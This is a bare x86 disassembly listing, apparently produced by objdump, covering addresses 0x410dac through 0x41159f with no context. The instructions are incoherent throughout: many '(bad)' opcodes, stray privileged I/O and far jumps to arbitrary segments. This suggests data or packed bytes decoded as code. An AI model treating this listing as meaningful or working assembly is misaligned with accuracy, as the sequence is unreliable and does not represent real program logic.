  410dac:	test   eax,0x36157b97
  410db1:	gs or  eax,0xbecf3a24
  410db7:	mov    dl,dh
  410db9:	stos   DWORD PTR es:[edi],eax
  410dba:	mov    dl,0x63
  410dbc:	cmp    edx,0xa01c409c
  410dc2:	adc    bh,bl
  410dc4:	stos   DWORD PTR es:[edi],eax
  410dc5:	and    ch,BYTE PTR [eax-0x325f04ba]
  410dcb:	pop    esi
  410dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dcd:	cmp    DWORD PTR [eax],edx
  410dcf:	adc    al,0x87
  410dd1:	icebp  
  410dd2:	(bad)  
  410dd3:	sbb    ah,BYTE PTR [ebp-0x58772945]
  410dd9:	cwde   
  410dda:	bound  ebp,QWORD PTR [ebp+0x3b]
  410ddd:	mov    ds,WORD PTR [edx-0x2bd8fdd2]
  410de3:	mov    ah,0x3
  410de5:	sub    eax,0xd2105421
  410dea:	fdivr  QWORD PTR [edx-0x59]
  410ded:	fisubr DWORD PTR [ebp+0x48]
  410df0:	mov    WORD PTR [esp+eax*8+0x1d25dbca],fs
  410df7:	das    
  410df8:	inc    ebx
  410df9:	sbb    eax,0xf3c60453
  410dfe:	sbb    ah,0x89
  410e01:	out    0xf4,al
  410e03:	inc    esi
  410e04:	mov    bl,0x2
  410e06:	ror    DWORD PTR [esi],cl
  410e08:	xchg   edx,eax
  410e09:	test   DWORD PTR [ecx-0x4f901fce],esp
  410e0f:	adc    cl,BYTE PTR [edi+0x7dc61332]
  410e15:	jae    0x410e11
  410e17:	mov    ah,0x4
  410e19:	retf   0x8f1f
  410e1c:	frstor [ecx+ecx*2]
  410e1f:	jbe    0x410dad
  410e21:	add    edx,DWORD PTR [ebx-0x1f18511b]
  410e27:	pushf  
  410e28:	rcl    DWORD PTR [ecx+0xf43f8b3],1
  410e2e:	sahf   
  410e2f:	mov    esp,0x6a74c71
  410e34:	push   ebx
  410e35:	into   
  410e36:	outs   dx,BYTE PTR ds:[esi]
  410e37:	mov    ch,0x87
  410e39:	loope  0x410e4b
  410e3b:	jmp    0x410ea4
  410e3d:	push   ds
  410e3e:	ss pushf 
  410e40:	imul   edi,DWORD PTR [ecx],0xffffff9d
  410e43:	dec    ebp
  410e44:	cmp    al,0xd8
  410e46:	icebp  
  410e47:	sub    eax,0xc34a8c1
  410e4c:	sbb    eax,0x50ff3f8
  410e51:	std    
  410e52:	add    eax,edi
  410e54:	mov    dh,0xe3
  410e56:	pop    eax
  410e57:	push   ss
  410e58:	das    
  410e59:	sub    eax,DWORD PTR [eax]
  410e5b:	or     ebp,DWORD PTR [ebx+0x74bc2a8e]
  410e61:	call   0xc10e349f
  410e66:	jmp    0x410e42
  410e68:	leave  
  410e69:	mov    al,0xb0
  410e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e6c:	fcom   DWORD PTR [ecx+0x0]
  410e6f:	sub    al,0xec
  410e71:	push   ecx
  410e72:	xchg   edi,eax
  410e73:	mov    edx,ebx
  410e75:	fsub   DWORD PTR [ecx-0x25]
  410e78:	gs popf 
  410e7a:	dec    esi
  410e7b:	push   0xffffffe8
  410e7d:	cwde   
  410e7e:	lock into 
  410e80:	mov    edi,0xec0160e
  410e85:	inc    edi
  410e86:	mov    bl,0xd3
  410e88:	jno    0x410ee0
  410e8a:	sub    eax,0x7b13b295
  410e8f:	sahf   
  410e90:	arpl   WORD PTR [edx-0x3],dx
  410e93:	ret    0x1b33
  410e96:	push   0x44224cf4
  410e9b:	mov    edx,0x17d66c69
  410ea0:	mov    edx,0x671e8b91
  410ea5:	adc    eax,0xdac90941
  410eaa:	js     0x410e2e
  410eac:	imul   edi,DWORD PTR [ebx-0x1b],0x67a28a8a
  410eb3:	clc    
  410eb4:	jmp    0x410ed1
  410eb6:	xchg   ebx,eax
  410eb7:	popf   
  410eb8:	push   ebx
  410eb9:	xchg   edi,eax
  410eba:	push   esi
  410ebb:	dec    ecx
  410ebc:	mov    ds:0x5b62942f,eax
  410ec1:	push   0xbcba3b8
  410ec6:	arpl   cx,si
  410ec8:	pop    esp
  410ec9:	cld    
  410eca:	pop    ebx
  410ecb:	xor    bl,BYTE PTR [edi+0x495bdd61]
  410ed1:	mov    esp,0x7d21f87c
  410ed6:	(bad)  
  410ed8:	jmp    0x6c9c40ed
  410edd:	sti    
  410ede:	popf   
  410edf:	mov    dl,ah
  410ee1:	daa    
  410ee2:	and    ecx,DWORD PTR [edx-0x67]
  410ee5:	je     0x410f44
  410ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ee8:	jb     0x410e7c
  410eea:	mov    ebx,0xc73ecec2
  410eef:	sahf   
  410ef0:	pusha  
  410ef1:	pop    ss
  410ef2:	push   ds
  410ef3:	jl     0x410e75
  410ef5:	cmp    eax,0x7a644097
  410efa:	ss hlt 
  410efc:	ds xchg edx,eax
  410efe:	jae    0x410f3a
  410f00:	add    DWORD PTR [edx-0x5c],edi
  410f03:	pop    esp
  410f04:	pop    ecx
  410f05:	mov    BYTE PTR [eax-0x15770b30],bl
  410f0b:	cmp    edx,DWORD PTR [esi+esi*8]
  410f0e:	shl    BYTE PTR [esi+0x6a],1
  410f11:	and    BYTE PTR [ecx-0x29],ah
  410f14:	shl    BYTE PTR [ecx-0x5ea5eb31],0xd3
  410f1b:	cmp    DWORD PTR [edx],esp
  410f1d:	imul   ebx,DWORD PTR [esi+0x79],0xb55d8bb2
  410f24:	add    eax,0x3cad0d63
  410f29:	xchg   DWORD PTR ds:0x5747e70f,edi
  410f2f:	jle    0x410fa1
  410f31:	xchg   esp,eax
  410f32:	mov    dh,0xb3
  410f34:	jns    0x410f52
  410f36:	xchg   BYTE PTR [edi+0x2c9ee135],al
  410f3c:	daa    
  410f3d:	pop    edx
  410f3e:	ins    BYTE PTR es:[edi],dx
  410f3f:	loop   0x410f4f
  410f41:	sbb    eax,0xb40089fe
  410f46:	das    
  410f47:	jl     0x410fae
  410f49:	dec    edi
  410f4a:	push   cs
  410f4b:	pop    ecx
  410f4c:	mov    DWORD PTR [ecx+0x68],edi
  410f4f:	fs neg edi
  410f52:	enter  0xa578,0x1a
  410f56:	aam    0x55
  410f58:	mov    ebp,0x8a054970
  410f5d:	pop    edi
  410f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f5f:	adc    BYTE PTR [esi],dh
  410f61:	mov    ebx,0xf21c2b4d
  410f66:	les    esi,FWORD PTR [eax]
  410f68:	mov    ebx,0x4a11c677
  410f6d:	icebp  
  410f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f6f:	xchg   ebx,eax
  410f70:	push   0x50c0118f
  410f75:	loop   0x410fba
  410f77:	popf   
  410f78:	cdq    
  410f79:	imul   esp,DWORD PTR [edx],0x39
  410f7c:	dec    esp
  410f7d:	dec    edi
  410f7e:	dec    edi
  410f7f:	add    bh,dl
  410f81:	lods   eax,DWORD PTR ds:[esi]
  410f82:	adc    al,0xb4
  410f84:	push   ss
  410f85:	retf   
  410f86:	inc    edx
  410f87:	fst    QWORD PTR [edi-0x5a]
  410f8a:	mov    ds:0x27660c4f,al
  410f8f:	mov    ss,edx
  410f91:	pop    ebx
  410f92:	test   DWORD PTR [eax-0x760f040a],eax
  410f98:	add    al,0xc5
  410f9a:	xchg   esi,eax
  410f9b:	or     ah,ch
  410f9d:	xor    DWORD PTR [edi-0x6f],ebx
  410fa0:	push   es
  410fa1:	pop    ds
  410fa2:	or     bl,BYTE PTR [eax+0x3c9d888f]
  410fa8:	and    eax,0x20c7a00e
  410fad:	test   DWORD PTR ds:0x8bccb576,edx
  410fb3:	pop    edi
  410fb4:	repnz jecxz 0x410ffc
  410fb7:	cld    
  410fb8:	xchg   edx,eax
  410fb9:	call   0xe297:0xdc872305
  410fc0:	xor    ch,BYTE PTR [ebx+0xf]
  410fc3:	mov    BYTE PTR [ecx+0x1d7ce5db],0x7f
  410fca:	scas   al,BYTE PTR es:[edi]
  410fcb:	ret    
  410fcc:	sub    al,0xe1
  410fce:	popf   
  410fcf:	dec    edi
  410fd0:	xchg   ch,bl
  410fd2:	xchg   esp,eax
  410fd3:	inc    ecx
  410fd4:	std    
  410fd5:	leave  
  410fd6:	pop    ecx
  410fd7:	and    bh,BYTE PTR [edx-0x43]
  410fda:	int3   
  410fdb:	xchg   edx,eax
  410fdc:	bound  edi,QWORD PTR [ebp-0x2e]
  410fdf:	or     al,0xcb
  410fe1:	mov    ds:0xd9069299,al
  410fe6:	rcpps  xmm1,XMMWORD PTR [edi-0x89989e9]
  410fed:	adc    bh,bl
  410fef:	pop    DWORD PTR [edx+0x3f]
  410ff2:	mov    ch,cl
  410ff4:	mov    esi,0x7a506eef
  410ff9:	jle    0x410fa1
  410ffb:	pusha  
  410ffc:	(bad)  
  410ffd:	iret   
  410ffe:	rol    DWORD PTR ds:[eax+0x41],0xa7
  411003:	pop    esp
  411004:	add    BYTE PTR [esi+ebp*2-0xc67882],bh
  41100b:	add    al,0x4d
  41100d:	cmp    edx,DWORD PTR [ecx]
  41100f:	fwait
  411010:	das    
  411011:	jnp    0x41100f
  411013:	dec    ebp
  411014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411015:	adc    eax,0x7fd6676f
  41101a:	xchg   esi,eax
  41101b:	jp     0x411030
  41101d:	cdq    
  41101e:	les    edi,FWORD PTR [ecx-0x50]
  411021:	xchg   ecx,eax
  411022:	retf   0x2e35
  411025:	dec    ecx
  411026:	jmp    0x352b:0x12d582c7
  41102d:	loop   0x410fdd
  41102f:	cmp    cl,al
  411031:	push   edi
  411032:	mov    ebx,0xe5e6fdb0
  411037:	imul   ecx,esp,0x6f106d3a
  41103d:	push   ebx
  41103e:	push   esi
  41103f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411040:	data16 fwait
  411042:	and    DWORD PTR [edi],edi
  411044:	iret   
  411045:	es jle 0x410fff
  411048:	(bad)  
  411049:	daa    
  41104a:	ret    
  41104b:	sub    DWORD PTR [edi],ecx
  41104d:	sar    ebx,1
  41104f:	add    ebx,ecx
  411051:	nop
  411052:	or     DWORD PTR [edx],ebp
  411054:	arpl   WORD PTR [ebp+0x23ed1260],si
  41105a:	scas   eax,DWORD PTR es:[edi]
  41105b:	call   0x11f8:0x31200ebc
  411062:	cs (bad) 
  411064:	jle    0x4110c9
  411066:	sub    eax,0x731ef0ee
  41106b:	aas    
  41106c:	xchg   esp,eax
  41106d:	jo     0x411034
  41106f:	add    esp,DWORD PTR [edx-0x4e]
  411072:	clc    
  411073:	outs   dx,DWORD PTR gs:[esi]
  411075:	test   DWORD PTR [eax+eiz*8-0x13b66db8],ecx
  41107c:	iret   
  41107d:	stos   DWORD PTR es:[edi],eax
  41107e:	sbb    BYTE PTR [eax-0x64dc71b4],ch
  411084:	push   ss
  411085:	sbb    BYTE PTR [ecx+0x3a],dh
  411088:	adc    ebp,ebp
  41108a:	call   0x7535eaa8
  41108f:	xor    DWORD PTR [edx],ebx
  411091:	fnstsw WORD PTR [ebp-0x758a6e11]
  411097:	ins    BYTE PTR es:[edi],dx
  411098:	lock imul edx,DWORD PTR ds:0x5e7b6cfc,0xffffffce
  4110a0:	inc    esp
  4110a1:	in     eax,dx
  4110a2:	loope  0x41109b
  4110a4:	add    DWORD PTR [esi+0x53],0x62
  4110a8:	not    BYTE PTR [edx-0x3c4b6206]
  4110ae:	mov    ds:0x1ea97b1,al
  4110b3:	and    esi,DWORD PTR [edi+0xb]
  4110b6:	lahf   
  4110b7:	aas    
  4110b8:	and    eax,0xb2de4fbc
  4110bd:	push   0x75e4cf94
  4110c2:	aam    0x1a
  4110c4:	cmp    dl,al
  4110c6:	and    eax,0x643e4359
  4110cb:	dec    DWORD PTR [ebx+0x2347cd8c]
  4110d1:	lea    esp,[edi+ecx*4-0xa]
  4110d5:	out    0xd,eax
  4110d7:	jno    0x411111
  4110d9:	mov    bh,BYTE PTR [ebx+ecx*8+0x22d047a2]
  4110e0:	sub    esp,DWORD PTR [edx]
  4110e2:	sahf   
  4110e3:	call   0x7011:0xd5bc9747
  4110ea:	ror    BYTE PTR [esi+ebx*4+0x4bf5db4],cl
  4110f1:	inc    ebp
  4110f2:	cld    
  4110f3:	xor    DWORD PTR [edi],ecx
  4110f5:	(bad)  
  4110f6:	jne    0x4110dd
  4110f8:	xchg   esp,eax
  4110f9:	sub    ebx,ebx
  4110fb:	pop    ss
  4110fc:	(bad)  
  4110fd:	xor    al,0xea
  4110ff:	outs   dx,BYTE PTR ds:[esi]
  411100:	push   ds
  411101:	and    DWORD PTR [ecx],esp
  411103:	pushf  
  411104:	mov    ds:0xe57992a7,al
  411109:	(bad)  [edi]
  41110b:	ret    
  41110c:	mov    esp,0x46ee46f3
  411111:	mov    ah,0x29
  411113:	mov    eax,0xd56dd566
  411118:	push   eax
  411119:	jb     0x4110b4
  41111b:	push   edi
  41111c:	loopne 0x411111
  41111e:	call   0x53fa:0x7a9a9fce
  411125:	adc    eax,0x3578e4ab
  41112a:	jecxz  0x4110cd
  41112c:	xor    ah,BYTE PTR [ecx+eiz*2+0x6401f444]
  411133:	add    eax,0x567b6b59
  411138:	int    0xb3
  41113a:	add    BYTE PTR [ebx+0x4e0fe381],0x2b
  411141:	(bad)  
  411142:	xchg   DWORD PTR [ebx-0x3ab0357],esp
  411148:	push   0x14
  41114a:	sbb    al,0xb8
  41114c:	mov    bh,0xea
  41114e:	xchg   ecx,eax
  41114f:	jmp    0x411154
  411151:	ds xchg ecx,eax
  411153:	clc    
  411154:	or     eax,0x10d79c17
  411159:	lea    esp,[edi-0x654be4f6]
  41115f:	jb     0x411107
  411161:	jmp    0x4111c5
  411163:	shl    BYTE PTR [ecx],cl
  411165:	and    eax,0xc47053d0
  41116a:	rcr    BYTE PTR [ebp+esi*1+0x44],cl
  41116e:	xor    al,0x27
  411170:	pop    esi
  411171:	out    dx,al
  411172:	mul    DWORD PTR [esp+esi*1]
  411175:	mov    al,ds:0x7a2ac3bc
  41117a:	or     eax,0xcea464a4
  41117f:	inc    ecx
  411180:	sbb    edx,DWORD PTR [ebx-0x318e78af]
  411186:	icebp  
  411187:	xchg   ecx,eax
  411188:	mov    al,0xab
  41118a:	scas   al,BYTE PTR es:[edi]
  41118b:	out    0x17,eax
  41118d:	sar    DWORD PTR [esi+0x53],0xc9
  411191:	fwait
  411192:	aas    
  411193:	xchg   ebx,eax
  411194:	ja     0x411145
  411196:	push   esp
  411197:	mov    eax,ds:0x91584660
  41119c:	mov    ah,BYTE PTR [esi-0x15]
  41119f:	sub    DWORD PTR [ecx-0x49f4a710],esp
  4111a5:	xchg   edx,eax
  4111a6:	sti    
  4111a7:	fdivr  st,st(6)
  4111a9:	scas   al,BYTE PTR es:[edi]
  4111aa:	mov    ch,0x90
  4111ac:	stos   BYTE PTR es:[di],al
  4111ae:	pop    eax
  4111af:	bound  edi,QWORD PTR [edx+0x3d]
  4111b2:	jns    0x41119b
  4111b4:	or     BYTE PTR [edx],0x64
  4111b7:	out    0x11,eax
  4111b9:	nop
  4111ba:	mov    edi,0x5ecc1e57
  4111bf:	cmp    BYTE PTR [ecx+0x138c0f17],cl
  4111c5:	push   eax
  4111c6:	inc    edi
  4111c7:	out    dx,eax
  4111c8:	push   ss
  4111c9:	sbb    al,0x80
  4111cb:	(bad)  [ebx+0x46]
  4111ce:	iret   
  4111cf:	fwait
  4111d0:	in     al,dx
  4111d1:	sbb    eax,0x320b1ecf
  4111d6:	sub    eax,0xffffffc0
  4111d9:	jl     0x411178
  4111db:	repnz push ds
  4111dd:	lds    edi,FWORD PTR [esi+0x28761b17]
  4111e3:	mov    es,WORD PTR [ecx]
  4111e5:	(bad)  
  4111e6:	jg     0x41123e
  4111e8:	out    0x55,al
  4111ea:	dec    ecx
  4111eb:	adc    eax,0x196b23f0
  4111f0:	mov    ds:0x4f2fbddb,eax
  4111f5:	fadd   DWORD PTR [ebp-0x3cbfb4a9]
  4111fb:	inc    ecx
  4111fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111fd:	jmpw   0x1564
  411201:	call   0x68e0:0x7a0c9c25
  411208:	or     edx,DWORD PTR [ebx]
  41120a:	xor    eax,0xba581f69
  41120f:	mov    ecx,DWORD PTR [ebx+eax*8+0x16edf130]
  411216:	cmp    esi,DWORD PTR [ebx+ebp*1]
  411219:	cmp    DWORD PTR [ecx+esi*1-0x49],ebx
  41121d:	sub    DWORD PTR [ecx+0xf],esp
  411220:	ror    BYTE PTR [ebx-0x33a6f6b9],1
  411226:	ins    BYTE PTR es:[edi],dx
  411227:	repz fidivr WORD PTR [edi+0x1]
  41122b:	add    DWORD PTR [ecx+0x4730925a],ecx
  411231:	(bad)  
  411233:	mov    BYTE PTR [edx],0xb8
  411236:	ins    BYTE PTR es:[edi],dx
  411237:	adc    ebx,0x41
  41123a:	xor    DWORD PTR [edi+0x276e4522],0x964f883b
  411244:	aaa    
  411245:	ja     0x411296
  411247:	xchg   ecx,eax
  411248:	xchg   dl,ch
  41124a:	nop
  41124b:	(bad)  [eax+0x19]
  41124e:	pop    edi
  41124f:	adc    BYTE PTR [ebx+0x3d0aa7e4],ch
  411255:	jns    0x4112a6
  411257:	mov    esi,0x9ae57c46
  41125c:	push   eax
  41125d:	sar    DWORD PTR [ecx+0x2d9e14f3],0xd6
  411264:	clc    
  411265:	xor    DWORD PTR [edi-0x1c83b8b4],ebx
  41126b:	loopne 0x41121e
  41126d:	push   ss
  41126e:	imul   ebp,DWORD PTR [esi+0x1f],0xaf17b71d
  411275:	add    eax,0x75f94fbd
  41127a:	not    ebx
  41127c:	outs   dx,BYTE PTR ds:[esi]
  41127d:	or     eax,0xbb51f60d
  411282:	ja     0x411228
  411284:	sti    
  411285:	arpl   di,bp
  411287:	add    edx,DWORD PTR [esi]
  411289:	add    eax,0x87f475f6
  41128e:	sub    dl,BYTE PTR [edi]
  411290:	xor    dl,BYTE PTR [edx+0x2790112c]
  411296:	and    al,0x91
  411298:	inc    ebx
  411299:	scas   eax,DWORD PTR es:[edi]
  41129a:	into   
  41129b:	popa   
  41129c:	les    ebp,FWORD PTR [edi-0x722d43be]
  4112a2:	push   esp
  4112a3:	ins    DWORD PTR es:[edi],dx
  4112a4:	xchg   ch,bh
  4112a6:	push   ss
  4112a7:	mov    cl,0x2d
  4112a9:	mov    eax,ds:0x9c7ffdb1
  4112ae:	(bad)  
  4112af:	shr    DWORD PTR [eax+0x50],cl
  4112b2:	pop    esp
  4112b3:	rcr    DWORD PTR [eax],0x8c
  4112b6:	inc    ebx
  4112b7:	dec    edx
  4112b8:	inc    ebp
  4112b9:	mov    esi,0x207935a1
  4112be:	mov    ah,0x16
  4112c0:	(bad)  
  4112c1:	jmp    0x41129c
  4112c3:	pop    edx
  4112c4:	xor    al,0xd9
  4112c6:	clc    
  4112c7:	jnp    0x411287
  4112c9:	xor    edx,esp
  4112cb:	data16 out dx,al
  4112cd:	retf   0x8b46
  4112d0:	call   0xe063:0xfcd50515
  4112d7:	idiv   BYTE PTR [ebx]
  4112d9:	inc    ecx
  4112da:	push   0x13e87bb0
  4112df:	pop    edi
  4112e0:	(bad)  
  4112e1:	cld    
  4112e2:	pop    ecx
  4112e3:	daa    
  4112e4:	jae    0x41131c
  4112e6:	push   ds
  4112e7:	mov    dl,0x2d
  4112e9:	dec    edx
  4112ea:	pop    es
  4112eb:	inc    edi
  4112ec:	fsubr  DWORD PTR [ebp+0x50515b2e]
  4112f2:	xor    bl,ah
  4112f4:	xchg   ebx,eax
  4112f5:	lea    esi,[eax-0x43162a8b]
  4112fb:	mov    ds:0x4323b09b,eax
  411300:	adc    dh,BYTE PTR [ebp-0x17]
  411303:	push   ebp
  411304:	mov    dl,al
  411306:	test   BYTE PTR [esi],dh
  411308:	or     edx,edi
  41130a:	loope  0x411290
  41130c:	xlat   BYTE PTR ds:[ebx]
  41130d:	fs pop esp
  41130f:	iret   
  411310:	push   edx
  411311:	cmp    BYTE PTR [esi+0x6],dl
  411314:	fadd   DWORD PTR [ebp-0x283f3926]
  41131a:	mov    bl,0xd8
  41131c:	loopne 0x4112c9
  41131e:	clc    
  41131f:	fcomip st,st(5)
  411321:	mov    esp,0x7d6e9465
  411326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411327:	imul   edi,DWORD PTR [edi-0x14],0x61
  41132b:	mov    ch,0x2
  41132d:	push   cs
  41132e:	rol    DWORD PTR [edi],cl
  411330:	mov    dh,0x1a
  411332:	push   cs
  411333:	mov    WORD PTR [edx+0x53591f7a],fs
  411339:	loope  0x4112ed
  41133b:	cmp    ah,ah
  41133d:	or     edx,eax
  41133f:	nop
  411340:	dec    ebp
  411341:	xor    DWORD PTR [esi+0x9],0xbbbcecbf
  411348:	mov    dl,0x62
  41134a:	jp     0x41139a
  41134c:	pop    ebp
  41134d:	or     dl,dl
  41134f:	push   cs
  411350:	xor    eax,0xe672d22e
  411355:	(bad)  
  411357:	sbb    ah,bh
  411359:	iret   
  41135a:	xor    eax,0xbf94ba23
  41135f:	pushf  
  411360:	dec    ecx
  411361:	sbb    eax,0x4b67847f
  411366:	lds    edx,FWORD PTR [edi-0x67]
  411369:	scas   al,BYTE PTR es:[edi]
  41136a:	mov    ch,0x92
  41136c:	(bad)  
  41136d:	rcr    BYTE PTR [esp+edi*8],cl
  411370:	imul   edx,ebx,0xffffffc1
  411373:	xlat   BYTE PTR ds:[ebx]
  411374:	into   
  411375:	pop    es
  411376:	cs mov edi,0xd4c6cc43
  41137c:	push   ss
  41137d:	pop    esp
  41137e:	imul   edx,DWORD PTR [ecx+0x5e],0xcca1158f
  411385:	jae    0x4113da
  411387:	dec    edi
  411388:	inc    ebp
  411389:	adc    BYTE PTR ds:0xbe034c8c,0xb7
  411390:	xchg   ebp,eax
  411391:	aad    0xe
  411393:	ss mov eax,0x9c1c527
  411399:	push   eax
  41139a:	xor    DWORD PTR [esi],ecx
  41139c:	jb     0x4113ee
  41139e:	sub    BYTE PTR [edx+0x5d],ah
  4113a1:	push   edx
  4113a2:	mov    ah,0xd9
  4113a4:	lahf   
  4113a5:	mov    al,0xcb
  4113a7:	ja     0x411420
  4113a9:	inc    esi
  4113aa:	sbb    eax,0x205e67ac
  4113af:	out    dx,al
  4113b0:	in     al,0xcd
  4113b2:	push   0xd38f3625
  4113b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113b8:	sbb    BYTE PTR [edx],al
  4113ba:	ret    0xd6a0
  4113bd:	fs dec ebx
  4113bf:	jo     0x4113d3
  4113c1:	xor    al,0x61
  4113c3:	scas   al,BYTE PTR es:[edi]
  4113c4:	ds inc edi
  4113c6:	shl    DWORD PTR [esi-0x31551e09],0xda
  4113cd:	cmp    BYTE PTR [edx+0x71],ah
  4113d0:	scas   al,BYTE PTR es:[edi]
  4113d1:	fmul   QWORD PTR [ebx+ebp*8-0x597e66b5]
  4113d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113d9:	scas   al,BYTE PTR es:[edi]
  4113da:	inc    eax
  4113db:	jg     0x411362
  4113dd:	inc    dx
  4113df:	push   DWORD PTR [edi]
  4113e1:	rol    BYTE PTR [eax+0x40],cl
  4113e4:	cli    
  4113e5:	mov    ds:0x567a2021,eax
  4113ea:	(bad)  
  4113ec:	push   ebx
  4113ed:	nop
  4113ee:	xor    eax,DWORD PTR [ecx+eax*1+0x6e]
  4113f2:	das    
  4113f3:	pop    DWORD PTR [ebx]
  4113f5:	inc    edx
  4113f6:	frstor [ebp-0x73749eac]
  4113fc:	clc    
  4113fd:	imul   esi,DWORD PTR [edi],0x68
  411400:	add    cl,BYTE PTR [ebp-0x214ce14b]
  411406:	or     al,0xc6
  411408:	xor    eax,0xb92994a2
  41140d:	in     al,dx
  41140e:	in     al,0xdf
  411410:	loop   0x41145b
  411412:	fisubr WORD PTR [eax-0x18]
  411415:	std    
  411416:	(bad)  
  411417:	clc    
  411418:	cld    
  411419:	dec    ebp
  41141a:	ja     0x4113fa
  41141c:	inc    edx
  41141d:	out    0xc2,eax
  41141f:	ins    BYTE PTR es:[edi],dx
  411420:	and    al,0x54
  411422:	dec    esp
  411423:	(bad)  
  411424:	sbb    edx,DWORD PTR [ecx-0x74]
  411427:	(bad)  
  411428:	ins    DWORD PTR es:[edi],dx
  411429:	inc    edi
  41142a:	and    eax,0x11e2f496
  41142f:	mov    ch,0xea
  411431:	mov    dl,0xe
  411433:	imul   edi,DWORD PTR [ebp+0x46],0x1aad7e7d
  41143a:	fidivr WORD PTR [ebp+0x1108d672]
  411440:	das    
  411441:	inc    ecx
  411442:	mov    dl,0x1c
  411444:	xor    ah,BYTE PTR [edi-0x4bce1103]
  41144a:	iret   
  41144b:	hlt    
  41144c:	sbb    ch,dl
  41144e:	ins    BYTE PTR es:[edi],dx
  41144f:	push   cs
  411450:	(bad)  
  411451:	xchg   edx,eax
  411452:	call   0xa80c25da
  411457:	jns    0x41141c
  411459:	popf   
  41145a:	inc    ebp
  41145b:	outs   dx,BYTE PTR ds:[esi]
  41145c:	icebp  
  41145d:	push   edx
  41145e:	and    BYTE PTR [edi-0x7f80fb2c],ch
  411464:	add    al,0xbd
  411466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411467:	cmp    cl,dh
  411469:	xor    eax,0xd41b6a75
  41146e:	xchg   al,ah
  411470:	mov    esp,0x62edaaf1
  411475:	or     ebx,DWORD PTR [edx-0x431727ba]
  41147b:	dec    edi
  41147c:	add    DWORD PTR [ebx],eax
  41147e:	test   al,0x79
  411480:	cmp    ebp,DWORD PTR [eax+0x2dfda54b]
  411486:	fiadd  WORD PTR [ebx]
  411488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411489:	rcl    al,0x94
  41148c:	imul   ebp,DWORD PTR [ebp-0x206a153f],0x4d123f7
  411496:	push   ebx
  411497:	xchg   esp,eax
  411498:	add    esi,DWORD PTR [ecx-0x3e]
  41149b:	sub    BYTE PTR [ecx-0xd4f3f57],bh
  4114a1:	scas   eax,DWORD PTR es:[edi]
  4114a2:	js     0x4114eb
  4114a4:	mov    dh,0x9d
  4114a6:	or     DWORD PTR [edx-0x5d80c46e],edx
  4114ac:	std    
  4114ad:	xor    eax,0x857a269e
  4114b2:	int    0x87
  4114b4:	ja     0x4114cf
  4114b6:	push   cs
  4114b7:	jbe    0x411489
  4114b9:	das    
  4114ba:	xor    eax,0xee8b4bc6
  4114bf:	dec    edx
  4114c0:	adc    al,0x71
  4114c2:	mov    ecx,0x26952f2a
  4114c7:	test   al,0xa3
  4114c9:	fdiv   st(5),st
  4114cb:	stos   DWORD PTR es:[edi],eax
  4114cc:	push   eax
  4114cd:	mov    bl,0xf3
  4114cf:	push   cs
  4114d0:	xchg   ebp,eax
  4114d1:	and    dl,BYTE PTR [edi+0x50]
  4114d4:	adc    edi,esi
  4114d6:	test   BYTE PTR ds:0x3de8b387,ah
  4114dc:	jb     0x41145e
  4114de:	mov    ds:0xd0f714d3,eax
  4114e3:	aas    
  4114e4:	(bad)  
  4114e5:	mov    edx,0x2ee63428
  4114ea:	shl    BYTE PTR [eax-0x74],cl
  4114ed:	inc    esp
  4114ee:	xchg   ecx,eax
  4114ef:	mov    eax,0xe01b08da
  4114f4:	fs mov bh,0x1e
  4114f7:	dec    esp
  4114f8:	scas   eax,DWORD PTR es:[edi]
  4114f9:	jecxz  0x411509
  4114fb:	inc    esi
  4114fc:	cmp    al,0x32
  4114fe:	xchg   ebx,eax
  4114ff:	clc    
  411500:	or     ecx,DWORD PTR [esi-0x1b]
  411503:	adc    edi,DWORD PTR [eax+0x20]
  411506:	or     ch,BYTE PTR [edx-0x37]
  411509:	jmp    0x2626:0x2c08c545
  411510:	adc    ebp,DWORD PTR [ecx-0x42a8c2cb]
  411516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411517:	inc    esp
  411518:	test   al,0x4a
  41151a:	sbb    DWORD PTR [esp+eax*2-0x22f58160],0x43
  411522:	xor    BYTE PTR [eax-0xfc231b9],0xa6
  411529:	dec    edi
  41152a:	cmp    eax,0xb8d4416d
  41152f:	mov    edx,0x1e70dfca
  411534:	push   ds
  411535:	xchg   edx,eax
  411536:	pop    esp
  411537:	pop    edi
  411538:	jg     0x41151c
  41153a:	xchg   edi,eax
  41153b:	and    BYTE PTR [eax*1-0x7d043737],ch
  411542:	lds    ebx,FWORD PTR [edx]
  411544:	jmp    0xd528:0x1e14e7ed
  41154b:	test   BYTE PTR [edi],dh
  41154d:	popa   
  41154e:	out    dx,al
  41154f:	es in  eax,0xd3
  411552:	push   ss
  411553:	repz mov edi,0xb0945eb5
  411559:	pop    es
  41155a:	jmp    0xe42d15e9
  41155f:	mov    ch,0xbf
  411561:	cmp    al,0x5a
  411563:	out    0xd0,eax
  411565:	cs mov ch,0xe8
  411568:	fdiv   st(0),st
  41156a:	scas   eax,DWORD PTR es:[edi]
  41156b:	push   edi
  41156c:	dec    ecx
  41156d:	test   DWORD PTR [esi],ebp
  41156f:	in     al,0x4
  411571:	jno    0x4114fb
  411573:	retf   0xd27
  411576:	mov    dh,0xc
  411578:	and    cl,BYTE PTR [edx+ecx*8]
  41157b:	mov    bl,0x60
  41157d:	cmp    cl,BYTE PTR [edx+0x626cf8bc]
  411583:	repz out 0x7a,al
  411586:	or     bh,al
  411588:	push   es
  411589:	adc    al,0xd7
  41158b:	and    DWORD PTR [ecx],esp
  41158d:	or     cl,BYTE PTR [eax+0x15]
  411590:	jmp    0x9919f63b
  411595:	retf   
  411596:	jmp    0x4115b9
  411598:	out    dx,eax
  411599:	hlt    
  41159a:	retf   0xf11f
  41159d:	jns    0x4115b9
  41159f:	jae    0x41152e
